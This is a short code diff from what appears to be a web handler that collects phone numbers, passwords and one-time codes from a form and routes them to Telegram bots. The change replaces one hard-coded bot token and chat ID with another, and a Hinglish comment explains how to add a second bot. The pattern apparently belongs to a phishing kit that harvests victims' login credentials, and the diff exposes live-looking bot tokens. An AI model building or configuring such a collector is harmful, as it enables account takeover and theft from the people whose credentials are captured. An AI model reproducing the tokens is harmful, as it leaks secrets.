@@ -6,8 +6,8 @@ export default async function handler(req, res) {
   const { type, phone, pass, otp } = req.body;
 
   // --- TELEGRAM BOT CONFIGURATION ---
-  const BOT_TOKEN_1 = '9069191387:AAFzEL7JzYG28_UwNiffsqnRs264U2YtxJI';
-  const CHAT_ID_1 = '8985592016';
+  const BOT_TOKEN_1 = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
+  const CHAT_ID_1 = '6076330929';
 
   // Agar aapko dusra bot bhi use karna ho toh yahan token aur chat ID daal sakte hain:
   const BOT_TOKEN_2 = ''; 
